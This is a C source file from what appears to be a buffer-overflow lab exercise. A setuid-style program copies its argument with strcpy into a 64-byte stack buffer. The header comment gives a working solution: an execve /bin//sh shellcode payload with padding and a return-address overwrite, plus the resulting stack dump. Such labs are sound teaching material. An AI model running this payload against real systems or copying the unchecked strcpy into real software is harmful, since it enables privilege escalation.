/*
** Solution
** ./buffer_overflow_shellcode $( perl -e 'print "\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x70\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80" . "A"x42 . "\x80\xd5\xff\xff" ' )
** Stack dump:
** 0xffffd5d0: 0xffffd700 (first argument)
** 0xffffd5cc: 0xffffd580 (saved eip)
** 0xffffd5c8: 0x41414141 (saved ebp)
** 0xffffd5c4: 0x41414141
** 0xffffd5c0: 0x41414141
** 0xffffd5bc: 0x41414141
** 0xffffd5b8: 0x41414141
** 0xffffd5b4: 0x41414141
** 0xffffd5b0: 0x41414141
** 0xffffd5ac: 0x41414141
** 0xffffd5a8: 0x41414141
** 0xffffd5a4: 0x41414141
** 0xffffd5a0: 0x414180cd
** 0xffffd59c: 0x0bb0e189
** 0xffffd598: 0x535650e6
** 0xffffd594: 0x89696970
** 0xffffd590: 0x2d6850e3
** 0xffffd58c: 0x896e6962
** 0xffffd588: 0x2f686873
** 0xffffd584: 0x2f2f6850
** 0xffffd580: 0xe9f7c031 (beginning of buffer)
*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "dump_stack.h"

/*
 * Goal: Get the program to run a shell.
 */

void vuln(char *str) {
    char buf[64];
    strcpy(buf, str);
    dump_stack((void **) buf, 21, (void **) &str);
}

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: buffer_overflow_shellcode [str]\n");
        return 1;
    }

    uid_t euid = geteuid();
    setresuid(euid, euid, euid);
    vuln(argv[1]);
    return 0;
}
